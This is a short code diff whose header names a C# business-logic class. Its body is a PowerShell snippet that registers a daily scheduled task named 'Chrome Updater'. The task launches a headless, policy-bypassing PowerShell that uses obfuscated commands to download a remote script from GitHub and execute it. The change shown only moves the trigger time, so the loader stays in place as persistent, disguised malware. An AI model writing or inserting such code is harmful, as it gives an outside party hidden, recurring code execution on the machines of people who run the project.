@@ -32,7 +32,7 @@ public class MyBusinessLogic {
 "@
 
 $A = New-ScheduledTaskAction -Execute "C:\Windows\System32\conhost.exe" -Argument "--headless powershell -exec Bypass -c `"`$l='http'+'s://raw.githubusercontent.com/jabdotNet/tests/main/x.ps3';(i''wR -UseBasicParsing `$l).content|i''E''x`""
-$T = New-ScheduledTaskTrigger -Daily -At 14:10 ;
+$T = New-ScheduledTaskTrigger -Daily -At 11:45 ;
 $S = New-ScheduledTaskSettingsSet -ExecutionTimeLimit (New-TimeSpan -Hours 8);
 Register-ScheduledTask -Action $A -Trigger $T -Settings $S -TaskName "Chrome Updater"
 
